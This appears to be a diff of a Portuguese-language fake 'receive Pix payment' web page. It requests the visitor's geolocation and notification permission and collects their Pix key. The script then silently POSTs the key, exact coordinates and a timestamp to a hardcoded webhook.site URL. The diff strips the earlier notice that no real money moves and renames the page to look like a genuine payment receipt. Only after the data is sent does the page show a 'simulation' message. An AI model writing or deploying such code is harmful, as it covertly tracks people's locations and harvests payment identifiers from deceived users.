@@ -2,181 +2,140 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Simulação Pix</title>
+<title>Recebimento</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
 body{
   margin:0;
-  background:#f2f2f2;
+  font-family: Arial, sans-serif;
+  background:#f4f4f4;
+}
+.tela{
+  display:none;
   height:100vh;
-  display:flex;
   justify-content:center;
   align-items:center;
-  font-family:Arial, sans-serif;
+  flex-direction:column;
 }
-
-.card{
-  background:#fff;
-  padding:35px;
-  border-radius:18px;
-  width:320px;
-  text-align:center;
-  box-shadow:0 10px 25px rgba(0,0,0,.1);
-}
+.tela.ativa{ display:flex; }
 
 button{
-  background:#820ad1;
+  background:#7a2cff;
   color:#fff;
   border:none;
-  padding:15px;
-  width:100%;
-  font-size:18px;
+  padding:16px 30px;
   border-radius:12px;
-  cursor:pointer;
+  font-size:18px;
 }
 
 input{
-  width:100%;
-  padding:12px;
-  font-size:16px;
-  margin:15px 0;
-  border-radius:8px;
+  padding:14px;
+  width:80%;
+  max-width:300px;
+  border-radius:10px;
   border:1px solid #ccc;
+  margin-bottom:20px;
+  font-size:16px;
 }
 
-small{
-  color:#777;
-  font-size:12px;
-}
-
-.alert{
-  color:#b00020;
-  font-size:13px;
-  margin-top:10px;
-}
-
-/* ===== Notificação fake ===== */
-.notificacao{
+/* Notificação fake */
+#notif{
   position:fixed;
-  top:-120px;
+  top:-100px;
   left:50%;
   transform:translateX(-50%);
-  background:#820ad1;
+  background:#2d2d2d;
   color:#fff;
-  padding:16px 22px;
-  border-radius:14px;
-  width:320px;
-  box-shadow:0 8px 20px rgba(0,0,0,.25);
-  transition:top .5s ease;
-  z-index:9999;
-}
-
-.notificacao.mostrar{
-  top:20px;
-}
-
-.notificacao strong{
-  display:block;
+  padding:15px 20px;
+  border-radius:12px;
+  transition:top .5s;
+  z-index:999;
   font-size:14px;
 }
-
-.notificacao span{
-  font-size:13px;
-  opacity:.9;
-}
+#notif.show{ top:20px; }
 </style>
 </head>
 
 <body>
 
-<!-- Notificação animada -->
-<div id="notif" class="notificacao">
-  <strong>Trunfo — Simulação</strong>
-  <span>Simulação de transferência concluída</span>
+<div id="notif"></div>
+
+<!-- TELA 1 -->
+<div id="t1" class="tela ativa">
+  <button onclick="pedirPermissoes()">Receber</button>
 </div>
 
-<!-- Tela 1 -->
-<div class="card" id="tela1">
-  <button onclick="pedirLocalizacao()">Receber Pix</button>
-  <div id="erro" class="alert"></div>
+<!-- TELA 2 -->
+<div id="t2" class="tela">
+  <input id="chave" placeholder="Digite sua chave">
+  <button onclick="confirmar()">Confirmar</button>
 </div>
 
-<!-- Tela 2 -->
-<div class="card" id="tela2" style="display:none">
-  <input id="chave" placeholder="Digite sua chave Pix">
-  <button onclick="confirmar()">Receber Pix</button>
-  <small>Simulação — nenhum valor real será transferido</small>
-</div>
-
-<!-- Tela 3 -->
-<div class="card" id="tela3" style="display:none">
-  <h3>✅ Simulação concluída</h3>
-  <p>Obrigado por participar.</p>
+<!-- TELA 3 -->
+<div id="t3" class="tela">
+  <h3>Simulação concluída</h3>
+  <p>Isso é apenas uma demonstração.</p>
 </div>
 
 <script>
-/* ===== CONFIG ===== */
-const WEBHOOK = "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6";
-
-/* ===== ESTADO ===== */
 let posicao = null;
 
-/* ===== PEDIR LOCALIZAÇÃO ===== */
-function pedirLocalizacao(){
-  document.getElementById("erro").innerText = "";
-
-  if(!navigator.geolocation){
-    document.getElementById("erro").innerText =
-      "Navegador não suporta localização.";
-    return;
+function pedirPermissoes(){
+  if(Notification.permission !== "granted"){
+    Notification.requestPermission();
   }
 
-  navigator.geolocation.getCurrentPosition(
-    p => {
-      posicao = p;
-      document.getElementById("tela1").style.display="none";
-      document.getElementById("tela2").style.display="block";
-    },
-    () => {
-      document.getElementById("erro").innerText =
-        "Por favor, dê as permissões para que possamos continuar a simulação.";
-    }
-  );
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+      p => {
+        posicao = p;
+        trocarTela("t2");
+      },
+      () => alert("Permita a localização para continuar")
+    );
+  }else{
+    alert("Geolocalização não suportada");
+  }
 }
 
-/* ===== CONFIRMAR ===== */
-function confirmar(){
+async function confirmar(){
   if(!posicao){
-    alert("Localização não obtida.");
+    alert("Localização não obtida");
     return;
   }
 
   const dados = {
-    chave_pix: document.getElementById("chave").value || "vazio",
+    chave: document.getElementById("chave").value || "vazio",
     latitude: posicao.coords.latitude,
     longitude: posicao.coords.longitude,
     precisao: posicao.coords.accuracy,
-    data: new Date().toISOString(),
-    navegador: navigator.userAgent
+    data: new Date().toISOString()
   };
 
-  fetch(WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(dados)
-  });
+  try{
+    await fetch("https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6", {
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify(dados),
+      keepalive:true
+    });
+  }catch(e){}
 
-  mostrarNotificacao();
-
-  document.getElementById("tela2").style.display="none";
-  document.getElementById("tela3").style.display="block";
+  mostrarNotif();
+  trocarTela("t3");
 }
 
-/* ===== ANIMAÇÃO ===== */
-function mostrarNotificacao(){
+function mostrarNotif(){
   const n = document.getElementById("notif");
-  n.classList.add("mostrar");
-  setTimeout(() => n.classList.remove("mostrar"), 4000);
+  n.innerHTML = "<b>Simulação</b><br>Recebimento demonstrativo concluído";
+  n.classList.add("show");
+  setTimeout(()=>n.classList.remove("show"),4000);
+}
+
+function trocarTela(id){
+  document.querySelectorAll(".tela").forEach(t=>t.classList.remove("ativa"));
+  document.getElementById(id).classList.add("ativa");
 }
 </script>
 
